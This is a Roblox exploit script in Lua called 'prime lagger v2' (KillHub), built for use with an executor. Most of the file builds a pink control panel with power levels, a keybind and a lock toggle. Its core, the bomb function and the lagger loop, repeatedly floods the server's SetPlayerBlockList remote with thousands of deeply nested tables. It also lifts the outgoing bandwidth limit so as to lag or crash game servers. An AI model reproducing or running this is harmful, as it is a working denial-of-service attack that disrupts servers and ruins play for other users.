local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer
local ConfigFile = "KillHubConfig.json"
local NIVELES = {
    V1 = {
        poder = 23
    },
    V2 = {
        poder = 32
    },
    V3 = {
        poder = 70
    },
    V4 = {
        poder = 90
    }
}
local keybind = Enum.KeyCode.M
local listeningForInput = false
local laggerActive = false
local lagThread = nil
local nivelActual = "V1"
local ventanaBloqueada = false
local UI_CONFIG = {
    MainBg = Color3.fromRGB(255, 255, 255),
    TitleColor = Color3.fromRGB(236, 72, 153),
    TextColor = Color3.fromRGB(219, 39, 119),
    ButtonInact = Color3.fromRGB(252, 231, 243),
    ToggleOff = Color3.fromRGB(253, 242, 248),
    ToggleOn = Color3.fromRGB(236, 72, 153),
    LockColor = Color3.fromRGB(219, 39, 119),
    UnlockColor = Color3.fromRGB(244, 114, 182),
    Font = Enum.Font.GothamBlack,
    BorderColor = Color3.fromRGB(252, 231, 243),
    GlowColor = Color3.fromRGB(219, 39, 119),
    SelectorBg = Color3.fromRGB(253, 232, 240),
    SelectorAct = Color3.fromRGB(236, 72, 153),
    PurpleText = Color3.fromRGB(219, 39, 119),
    PowerColor = Color3.fromRGB(236, 72, 153)
}
local COLOR_SCHEMES = {
    [1] = {
        V1 = {
            bg = Color3.fromRGB(219, 39, 119),
            text = Color3.fromRGB(255, 255, 255)
        },
        V2 = {
            bg = Color3.fromRGB(236, 72, 153),
            text = Color3.fromRGB(255, 255, 255)
        },
        V3 = {
            bg = Color3.fromRGB(244, 114, 182),
            text = Color3.fromRGB(255, 255, 255)
        },
        V4 = {
            bg = Color3.fromRGB(249, 168, 212),
            text = Color3.fromRGB(255, 255, 255)
        },
        power = Color3.fromRGB(236, 72, 153),
        plus = Color3.fromRGB(236, 72, 153)
    },
    [2] = {
        V1 = {
            bg = Color3.fromRGB(219, 39, 119),
            text = Color3.fromRGB(255, 255, 255)
        },
        V2 = {
            bg = Color3.fromRGB(236, 72, 153),
            text = Color3.fromRGB(255, 255, 255)
        },
        V3 = {
            bg = Color3.fromRGB(244, 114, 182),
            text = Color3.fromRGB(255, 255, 255)
        },
        V4 = {
            bg = Color3.fromRGB(249, 168, 212),
            text = Color3.fromRGB(255, 255, 255)
        },
        power = Color3.fromRGB(236, 72, 153),
        plus = Color3.fromRGB(236, 72, 153)
    }
}
local BG1_ID = "rbxassetid://87814827032366"
local BG2_ID = "rbxassetid://86401501106150"
local currentBg = 1
local RED = Color3.fromRGB(236, 72, 153)
local DARK_RED = Color3.fromRGB(190, 24, 93)
local BG1_OFFSET_X = 0
local BG1_OFFSET_Y = 0
local function SaveConfig()
    local data = {
        Nivel = nivelActual,
        Bloqueado = ventanaBloqueada,
        Keybind = keybind.Name,
        Bg = currentBg
    }
    pcall(function()
        writefile(ConfigFile, HttpService:JSONEncode(data))
    end)
end
local function LoadConfig()
    if pcall(isfile, ConfigFile) and isfile(ConfigFile) then
        pcall(function()
            local data = HttpService:JSONDecode(readfile(ConfigFile))
            nivelActual = data.Nivel or "V1"
            ventanaBloqueada = data.Bloqueado or false
            if data.Keybind then
                local newKey = Enum.KeyCode[data.Keybind]
                if newKey then
                    keybind = newKey
                end
            end
            currentBg = data.Bg or 1
            if currentBg ~= 1 and currentBg ~= 2 then
                currentBg = 1
            end
        end)
    end
end
LoadConfig()
local function bomb(poder)
    local main, spam = {}, {
        {}
    }
    local z = spam[1]
    for i = 1, 25 do
        local t = {}
        table.insert(z, t)
        z = t
    end
    local max = math.min(12000, poder * 50)
    for i = 1, max do
        table.insert(main, spam)
    end
    pcall(function()
        game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(main)
    end)
end
local toggleBall, toggleContainer, btnV1, btnV2, btnV3, btnV4, lockButton
local titleLabel, textPower, keybindButton, toggleClick
local shrinkButton, growButton, contentFrame, mainFrame, bgImage, bgToggleButton
local function aplicarEsquema()
    local scheme = COLOR_SCHEMES[currentBg] or COLOR_SCHEMES[2]
    local function setButton(btn, key)
        if nivelActual == key then
            btn.BackgroundColor3 = scheme[key].bg
            btn.TextColor3 = scheme[key].text
            btn.BorderSizePixel = 0
        else
            btn.BackgroundColor3 = UI_CONFIG.ButtonInact
            btn.TextColor3 = Color3.fromRGB(219, 39, 119)
            btn.BorderSizePixel = 1
            btn.BorderColor3 = UI_CONFIG.BorderColor
        end
    end
    setButton(btnV1, "V1")
    setButton(btnV2, "V2")
    setButton(btnV3, "V3")
    setButton(btnV4, "V4")
    textPower.TextColor3 = scheme.power
    growButton.TextColor3 = scheme.plus
end
local function actualizarBg()
    if bgImage then
        if currentBg == 1 then
            bgImage.Image = BG1_ID
            bgImage.Position = UDim2.new(0, BG1_OFFSET_X, 0, BG1_OFFSET_Y)
        else
            bgImage.Image = BG2_ID
            bgImage.Position = UDim2.new(0, 0, 0, 0)
        end
    end
    if bgToggleButton then
        if currentBg == 1 then
            bgToggleButton.Text = "BG1"
            bgToggleButton.BackgroundColor3 = RED
            bgToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
        else
            bgToggleButton.Text = "BG2"
            bgToggleButton.BackgroundColor3 = DARK_RED
            bgToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
        end
    end
    aplicarEsquema()
end
local function actualizarSwitch()
    if toggleContainer then
        toggleContainer.BackgroundColor3 = UI_CONFIG.ToggleOff
    end
    if toggleBall then
        toggleBall.BackgroundColor3 = UI_CONFIG.ToggleOff
        if laggerActive then
            toggleBall.Position = UDim2.new(1, -18, 0.5, -9)
        else
            toggleBall.Position = UDim2.new(0, 3, 0.5, -9)
        end
    end
    if toggleClick then
        toggleClick.Text = laggerActive and "ACTIVE" or "INACTIVE"
        if laggerActive then
            toggleClick.TextColor3 = Color3.fromRGB(0, 255, 0)
        else
            toggleClick.TextColor3 = Color3.fromRGB(236, 72, 153)
        end
    end
end
local function actualizarCandado()
    lockButton.Text = ventanaBloqueada and "Lock" or "Unlock"
    lockButton.TextColor3 = ventanaBloqueada and Color3.fromRGB(219, 39, 119) or Color3.fromRGB(244, 114, 182)
end
local function actualizarKeybindButton()
    if keybindButton then
        local display = keybind.Name
        if display:match("Button") then
            display = display:gsub("Button", "")
        end
        keybindButton.Text = "KEY: " .. display
    end
end
local function toggleLagger()
    laggerActive = not laggerActive
    local targetPos = laggerActive and UDim2.new(1, -18, 0.5, -9) or UDim2.new(0, 3, 0.5, -9)
    TweenService:Create(toggleBall, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        Position = targetPos
    }):Play()
    toggleClick.Text = laggerActive and "ACTIVE" or "INACTIVE"
    if laggerActive then
        toggleClick.TextColor3 = Color3.fromRGB(0, 255, 0)
    else
        toggleClick.TextColor3 = Color3.fromRGB(236, 72, 153)
    end
    if laggerActive then
        if lagThread then
            task.cancel(lagThread)
        end
        lagThread = task.spawn(function()
            while laggerActive do
                pcall(function()
                    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(80000)
                end)
                bomb(NIVELES[nivelActual].poder)
                task.wait(0.18)
            end
        end)
    else
        if lagThread then
            task.cancel(lagThread)
            lagThread = nil
        end
    end
end
local BASE_W = 200
local BASE_H = 78
local MIN_WIDTH = 150
local MAX_WIDTH = 300
local MIN_HEIGHT = 60
local MAX_HEIGHT = 120
local STEP_W = 10
local STEP_H = 5
local function updateLayout()
    local currentW = mainFrame.Size.X.Offset
    local currentH = mainFrame.Size.Y.Offset
    local scaleX = currentW / BASE_W
    local scaleY = currentH / BASE_H
    local avgScale = (scaleX + scaleY) / 2
    titleLabel.Size = UDim2.new(0, 110 * scaleX, 0, 22 * scaleY)
    titleLabel.Position = UDim2.new(0, 8 * scaleX, 0, 0)
    titleLabel.TextSize = 14 * avgScale
    local keyX = 96 * scaleX
    local lockX = (145) * scaleX
    keybindButton.Size = UDim2.new(0, 34 * scaleX, 0, 14 * scaleY)
    keybindButton.Position = UDim2.new(0, keyX, 0, 1 * scaleY)
    keybindButton.TextSize = 6 * avgScale
    lockButton.Size = UDim2.new(0, 22 * scaleX, 0, 14 * scaleY)
    lockButton.Position = UDim2.new(0, lockX, 0, 1 * scaleY)
    lockButton.TextSize = 6 * avgScale
    shrinkButton.Size = UDim2.new(0, 14 * scaleX, 0, 14 * scaleY)
    shrinkButton.Position = UDim2.new(1, -30 * scaleX, 0, 2 * scaleY)
    shrinkButton.TextSize = 12 * avgScale
    growButton.Size = UDim2.new(0, 14 * scaleX, 0, 14 * scaleY)
    growButton.Position = UDim2.new(1, -16 * scaleX, 0, 2 * scaleY)
    growButton.TextSize = 12 * avgScale
    textPower.Size = UDim2.new(0, 45 * scaleX, 0, 18 * scaleY)
    textPower.Position = UDim2.new(0, 5 * scaleX, 0, 24 * scaleY)
    textPower.TextSize = 11 * avgScale
    bgToggleButton.Size = UDim2.new(0, 17 * scaleX, 0, 18 * scaleY)
    bgToggleButton.Position = UDim2.new(0, 55 * scaleX, 0, 24 * scaleY)
    bgToggleButton.TextSize = 7 * avgScale
    toggleContainer.Size = UDim2.new(0, 34 * scaleX, 0, 18 * scaleY)
    toggleContainer.Position = UDim2.new(0, 160 * scaleX, 0, 24 * scaleY)
    toggleBall.Size = UDim2.new(0, 12 * scaleX, 0, 12 * scaleY)
    if laggerActive then
        toggleBall.Position = UDim2.new(1, -14 * scaleX, 0.5, -7 * scaleY)
    else
        toggleBall.Position = UDim2.new(0, 3 * scaleX, 0.5, -7 * scaleY)
    end
    toggleClick.TextSize = 6 * avgScale
    local btnW = 42 * scaleX
    local btnH = 20 * scaleY
    local espaciado = 3 * scaleX
    local margenIzq = 5 * scaleX
    local btnY = 46 * scaleY
    btnV1.Size = UDim2.new(0, btnW, 0, btnH)
    btnV1.Position = UDim2.new(0, margenIzq, 0, btnY)
    btnV1.TextSize = 8 * avgScale
    btnV2.Size = UDim2.new(0, btnW, 0, btnH)
    btnV2.Position = UDim2.new(0, margenIzq + btnW + espaciado, 0, btnY)
    btnV2.TextSize = 8 * avgScale
    btnV3.Size = UDim2.new(0, btnW, 0, btnH)
    btnV3.Position = UDim2.new(0, margenIzq + (btnW + espaciado) * 2, 0, btnY)
    btnV3.TextSize = 8 * avgScale
    btnV4.Size = UDim2.new(0, btnW, 0, btnH)
    btnV4.Position = UDim2.new(0, margenIzq + (btnW + espaciado) * 3, 0, btnY)
    btnV4.TextSize = 7 * avgScale
end
local function resizeGUI(deltaW, deltaH)
    if ventanaBloqueada then
        return
    end
    local currentW = mainFrame.Size.X.Offset
    local currentH = mainFrame.Size.Y.Offset
    local newW = math.clamp(currentW + deltaW, MIN_WIDTH, MAX_WIDTH)
    local newH = math.clamp(currentH + deltaH, MIN_HEIGHT, MAX_HEIGHT)
    if newW == currentW and newH == currentH then
        return
    end
    mainFrame.Size = UDim2.new(0, newW, 0, newH)
    updateLayout()
end
if CoreGui:FindFirstChild("KillHub_UI") then
    CoreGui.KillHub_UI:Destroy()
end
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "KillHub_UI"
screenGui.Parent = CoreGui
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.ResetOnSpawn = false
mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
mainFrame.BackgroundTransparency = 0
mainFrame.BorderSizePixel = 2
mainFrame.BorderColor3 = Color3.fromRGB(219, 39, 119)
mainFrame.Size = UDim2.new(0, 200, 0, 78)
mainFrame.Position = UDim2.new(0.15, 0, 0.5, -39)
mainFrame.Parent = screenGui
mainFrame.ClipsDescendants = true
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 8)
bgImage = Instance.new("ImageLabel", mainFrame)
bgImage.Name = "BgImage"
bgImage.Size = UDim2.new(1, 0, 1, 0)
bgImage.Position = UDim2.new(0, 0, 0, 0)
bgImage.BackgroundTransparency = 1
bgImage.Image = BG1_ID
bgImage.ImageTransparency = 0
bgImage.ScaleType = Enum.ScaleType.Crop
bgImage.ZIndex = 0
Instance.new("UICorner", bgImage).CornerRadius = UDim.new(0, 8)
contentFrame = Instance.new("Frame", mainFrame)
contentFrame.BackgroundTransparency = 1
contentFrame.Size = UDim2.new(1, 0, 1, 0)
contentFrame.Position = UDim2.new(0, 0, 0, 0)
contentFrame.ZIndex = 1
Instance.new("UICorner", contentFrame).CornerRadius = UDim.new(0, 8)
local stars = {}
for i = 1, 35 do
    local star = Instance.new("Frame", contentFrame)
    star.BackgroundColor3 = Color3.fromRGB(219, 39, 119)
    star.BorderSizePixel = 0
    star.Size = UDim2.new(0, 1 + math.random() * 2, 0, 1 + math.random() * 2)
    star.Position = UDim2.new(math.random(), 0, math.random(), 0)
    star.ZIndex = 1
    star.BackgroundTransparency = 0.2 + math.random() * 0.5
    local corner = Instance.new("UICorner", star)
    corner.CornerRadius = UDim.new(1, 0)
    table.insert(stars, {
        frame = star,
        transparency = star.BackgroundTransparency,
        timer = 2 + math.random() * 2,
        elapsed = 0
    })
end
task.spawn(function()
    while true do
        for _, starData in ipairs(stars) do
            starData.elapsed = starData.elapsed + 0.1
            if starData.elapsed >= starData.timer then
                starData.elapsed = 0
                starData.timer = 2 + math.random() * 2
                local star = starData.frame
                TweenService:Create(star, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
                    BackgroundTransparency = 1
                }):Play()
                task.wait(0.2)
                star.Position = UDim2.new(math.random(), 0, math.random(), 0)
                local newSize = 1 + math.random() * 2
                star.Size = UDim2.new(0, newSize, 0, newSize)
                TweenService:Create(star, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
                    BackgroundTransparency = starData.transparency
                }):Play()
            end
        end
        task.wait(0.1)
    end
end)
titleLabel = Instance.new("TextLabel", contentFrame)
titleLabel.BackgroundTransparency = 1
titleLabel.Position = UDim2.new(0, 8, 0, 0)
titleLabel.Size = UDim2.new(0, 110, 0, 22)
titleLabel.Font = Enum.Font.GothamBlack
titleLabel.Text = "prime lagger v2"
titleLabel.TextColor3 = Color3.fromRGB(190, 24, 93)
titleLabel.TextSize = 14
titleLabel.TextXAlignment = Enum.TextXAlignment.Left
titleLabel.TextYAlignment = Enum.TextYAlignment.Center
titleLabel.ZIndex = 3
titleLabel.ClipsDescendants = false
task.spawn(function()
    local duration = 1.5
    while true do
        local color1 = RED
        local color2 = Color3.fromRGB(249, 168, 212)
        local tween1 = TweenService:Create(titleLabel, TweenInfo.new(duration, Enum.EasingStyle.Linear), {
            TextColor3 = color1
        })
        tween1:Play()
        tween1.Completed:Wait()
        local tween2 = TweenService:Create(titleLabel, TweenInfo.new(duration, Enum.EasingStyle.Linear), {
            TextColor3 = color2
        })
        tween2:Play()
        tween2.Completed:Wait()
    end
end)
keybindButton = Instance.new("TextButton", mainFrame)
keybindButton.BackgroundColor3 = Color3.fromRGB(253, 242, 248)
keybindButton.BackgroundTransparency = 0.1
keybindButton.Position = UDim2.new(0, 96, 0, 1)
keybindButton.Size = UDim2.new(0, 34, 0, 14)
keybindButton.Font = Enum.Font.GothamBlack
keybindButton.Text = "KEY: M"
keybindButton.TextColor3 = Color3.fromRGB(219, 39, 119)
keybindButton.TextSize = 6
keybindButton.AutoButtonColor = false
keybindButton.ZIndex = 2
Instance.new("UICorner", keybindButton).CornerRadius = UDim.new(1, 0)
actualizarKeybindButton()
lockButton = Instance.new("TextButton", mainFrame)
lockButton.BackgroundTransparency = 0
lockButton.BackgroundColor3 = Color3.fromRGB(253, 242, 248)
lockButton.BackgroundTransparency = 0.1
lockButton.Position = UDim2.new(0, 145, 0, 1)
lockButton.Size = UDim2.new(0, 22, 0, 14)
lockButton.Font = Enum.Font.GothamBlack
lockButton.TextSize = 6
lockButton.TextColor3 = Color3.fromRGB(219, 39, 119)
lockButton.AutoButtonColor = false
lockButton.ZIndex = 2
Instance.new("UICorner", lockButton).CornerRadius = UDim.new(1, 0)
lockButton.MouseButton1Click:Connect(function()
    ventanaBloqueada = not ventanaBloqueada
    actualizarCandado()
    SaveConfig()
end)
actualizarCandado()
shrinkButton = Instance.new("TextButton", mainFrame)
shrinkButton.BackgroundColor3 = Color3.fromRGB(253, 242, 248)
shrinkButton.BackgroundTransparency = 0.1
shrinkButton.Position = UDim2.new(1, -30, 0, 2)
shrinkButton.Size = UDim2.new(0, 14, 0, 14)
shrinkButton.Font = Enum.Font.GothamBlack
shrinkButton.Text = "-"
shrinkButton.TextColor3 = Color3.fromRGB(255, 255, 255)
shrinkButton.TextSize = 12
shrinkButton.AutoButtonColor = false
shrinkButton.ZIndex = 2
Instance.new("UICorner", shrinkButton).CornerRadius = UDim.new(1, 0)
shrinkButton.MouseButton1Click:Connect(function()
    resizeGUI(-STEP_W, -STEP_H)
end)
growButton = Instance.new("TextButton", mainFrame)
growButton.BackgroundColor3 = Color3.fromRGB(253, 242, 248)
growButton.BackgroundTransparency = 0.1
growButton.Position = UDim2.new(1, -16, 0, 2)
growButton.Size = UDim2.new(0, 14, 0, 14)
growButton.Font = Enum.Font.GothamBlack
growButton.Text = "+"
growButton.TextColor3 = Color3.fromRGB(236, 72, 153)
growButton.TextSize = 12
growButton.AutoButtonColor = false
growButton.ZIndex = 2
Instance.new("UICorner", growButton).CornerRadius = UDim.new(1, 0)
growButton.MouseButton1Click:Connect(function()
    resizeGUI(STEP_W, STEP_H)
end)
textPower = Instance.new("TextLabel", contentFrame)
textPower.BackgroundTransparency = 1
textPower.Position = UDim2.new(0, 5, 0, 24)
textPower.Size = UDim2.new(0, 45, 0, 18)
textPower.Font = Enum.Font.GothamBlack
textPower.Text = "POWER"
textPower.TextColor3 = Color3.fromRGB(236, 72, 153)
textPower.TextSize = 11
textPower.TextXAlignment = Enum.TextXAlignment.Left
textPower.TextYAlignment = Enum.TextYAlignment.Center
textPower.ZIndex = 2
toggleContainer = Instance.new("Frame", contentFrame)
toggleContainer.BackgroundColor3 = UI_CONFIG.ToggleOff
toggleContainer.Position = UDim2.new(0, 160, 0, 24)
toggleContainer.Size = UDim2.new(0, 34, 0, 18)
toggleContainer.ZIndex = 2
Instance.new("UICorner", toggleContainer).CornerRadius = UDim.new(1, 0)
toggleBall = Instance.new("Frame", toggleContainer)
toggleBall.BackgroundColor3 = UI_CONFIG.ToggleOff
toggleBall.Size = UDim2.new(0, 12, 0, 12)
toggleBall.Position = UDim2.new(0, 3, 0.5, -7)
toggleBall.ZIndex = 2
Instance.new("UICorner", toggleBall).CornerRadius = UDim.new(1, 0)
toggleClick = Instance.new("TextButton", toggleContainer)
toggleClick.BackgroundTransparency = 0
toggleClick.BackgroundColor3 = Color3.fromRGB(253, 242, 248)
toggleClick.Size = UDim2.new(1, 0, 1, 0)
toggleClick.ZIndex = 3
toggleClick.Font = Enum.Font.GothamBlack
toggleClick.Text = "INACTIVE"
toggleClick.TextSize = 6
toggleClick.TextColor3 = Color3.fromRGB(236, 72, 153)
toggleClick.TextXAlignment = Enum.TextXAlignment.Center
toggleClick.TextYAlignment = Enum.TextYAlignment.Center
toggleClick.MouseButton1Click:Connect(toggleLagger)
toggleClick.AutoButtonColor = false
Instance.new("UICorner", toggleClick).CornerRadius = UDim.new(1, 0)
bgToggleButton = Instance.new("TextButton", contentFrame)
bgToggleButton.BackgroundColor3 = RED
bgToggleButton.BackgroundTransparency = 0.1
bgToggleButton.Position = UDim2.new(0, 55, 0, 24)
bgToggleButton.Size = UDim2.new(0, 17, 0, 18)
bgToggleButton.Font = Enum.Font.GothamBlack
bgToggleButton.Text = "BG1"
bgToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
bgToggleButton.TextSize = 7
bgToggleButton.AutoButtonColor = false
bgToggleButton.ZIndex = 2
Instance.new("UICorner", bgToggleButton).CornerRadius = UDim.new(1, 0)
bgToggleButton.MouseButton1Click:Connect(function()
    if currentBg == 1 then
        currentBg = 2
    else
        currentBg = 1
    end
    actualizarBg()
    SaveConfig()
end)
keybindButton.MouseButton1Click:Connect(function()
    if listeningForInput then
        return
    end
    listeningForInput = true
    keybindButton.Text = "KEY: ..."
    keybindButton.BackgroundColor3 = Color3.fromRGB(219, 39, 119)
    keybindButton.TextColor3 = Color3.fromRGB(255, 255, 255)
end)
local inputConnection
inputConnection = UserInputService.InputBegan:Connect(function(input, gp)
    if not listeningForInput then
        return
    end
    if gp then
        return
    end
    local newKey = nil
    if input.KeyCode ~= Enum.KeyCode.Unknown then
        newKey = input.KeyCode
    elseif input.UserInputType == Enum.UserInputType.Gamepad1 and input.KeyCode ~= Enum.KeyCode.Unknown then
        newKey = input.KeyCode
    end
    if newKey then
        keybind = newKey
        actualizarKeybindButton()
        listeningForInput = false
        keybindButton.BackgroundColor3 = Color3.fromRGB(253, 242, 248)
        keybindButton.BackgroundTransparency = 0.1
        keybindButton.TextColor3 = Color3.fromRGB(219, 39, 119)
        SaveConfig()
    end
end)
local btnY = 46
local btnW = 42
local btnH = 20
local espaciado = 3
local margenIzq = 5
btnV1 = Instance.new("TextButton", contentFrame)
btnV1.Size = UDim2.new(0, btnW, 0, btnH)
btnV1.Position = UDim2.new(0, margenIzq, 0, btnY)
btnV1.Font = UI_CONFIG.Font
btnV1.Text = "V1"
btnV1.TextColor3 = Color3.fromRGB(219, 39, 119)
btnV1.TextSize = 8
btnV1.AutoButtonColor = false
btnV1.BackgroundColor3 = UI_CONFIG.ButtonInact
btnV1.BorderSizePixel = 1
btnV1.BorderColor3 = UI_CONFIG.BorderColor
btnV1.ZIndex = 2
Instance.new("UICorner", btnV1).CornerRadius = UDim.new(1, 0)
btnV1.MouseButton1Click:Connect(function()
    nivelActual = "V1"
    aplicarEsquema()
    SaveConfig()
end)
btnV2 = Instance.new("TextButton", contentFrame)
btnV2.Size = UDim2.new(0, btnW, 0, btnH)
btnV2.Position = UDim2.new(0, margenIzq + btnW + espaciado, 0, btnY)
btnV2.Font = UI_CONFIG.Font
btnV2.Text = "V2"
btnV2.TextColor3 = Color3.fromRGB(219, 39, 119)
btnV2.TextSize = 8
btnV2.AutoButtonColor = false
btnV2.BackgroundColor3 = UI_CONFIG.ButtonInact
btnV2.BorderSizePixel = 1
btnV2.BorderColor3 = UI_CONFIG.BorderColor
btnV2.ZIndex = 2
Instance.new("UICorner", btnV2).CornerRadius = UDim.new(1, 0)
btnV2.MouseButton1Click:Connect(function()
    nivelActual = "V2"
    aplicarEsquema()
    SaveConfig()
end)
btnV3 = Instance.new("TextButton", contentFrame)
btnV3.Size = UDim2.new(0, btnW, 0, btnH)
btnV3.Position = UDim2.new(0, margenIzq + (btnW + espaciado) * 2, 0, btnY)
btnV3.Font = UI_CONFIG.Font
btnV3.Text = "V3"
btnV3.TextColor3 = Color3.fromRGB(219, 39, 119)
btnV3.TextSize = 8
btnV3.AutoButtonColor = false
btnV3.BackgroundColor3 = UI_CONFIG.ButtonInact
btnV3.BorderSizePixel = 1
btnV3.BorderColor3 = UI_CONFIG.BorderColor
btnV3.ZIndex = 2
Instance.new("UICorner", btnV3).CornerRadius = UDim.new(1, 0)
btnV3.MouseButton1Click:Connect(function()
    nivelActual = "V3"
    aplicarEsquema()
    SaveConfig()
end)
btnV4 = Instance.new("TextButton", contentFrame)
btnV4.Size = UDim2.new(0, btnW, 0, btnH)
btnV4.Position = UDim2.new(0, margenIzq + (btnW + espaciado) * 3, 0, btnY)
btnV4.Font = UI_CONFIG.Font
btnV4.Text = "V4"
btnV4.TextColor3 = Color3.fromRGB(219, 39, 119)
btnV4.TextSize = 7
btnV4.AutoButtonColor = false
btnV4.BackgroundColor3 = UI_CONFIG.ButtonInact
btnV4.BorderSizePixel = 1
btnV4.BorderColor3 = UI_CONFIG.BorderColor
btnV4.ZIndex = 2
Instance.new("UICorner", btnV4).CornerRadius = UDim.new(1, 0)
btnV4.MouseButton1Click:Connect(function()
    nivelActual = "V4"
    aplicarEsquema()
    SaveConfig()
end)
actualizarBg()
actualizarSwitch()
updateLayout()
aplicarEsquema()
local isDragging, dragStart, startPos = false, nil, nil
mainFrame.InputBegan:Connect(function(input)
    if ventanaBloqueada then
        return
    end
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isDragging = true
        dragStart = input.Position
        startPos = mainFrame.Position
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if not isDragging or ventanaBloqueada then
        return
    end
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        local delta = input.Position - dragStart
        mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)
mainFrame.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isDragging = false
    end
end)
UserInputService.InputBegan:Connect(function(input, gp)
    if gp then
        return
    end
    if input.KeyCode == keybind or (input.UserInputType == Enum.UserInputType.Gamepad1 and input.KeyCode == keybind) then
        toggleLagger()
    end
end)
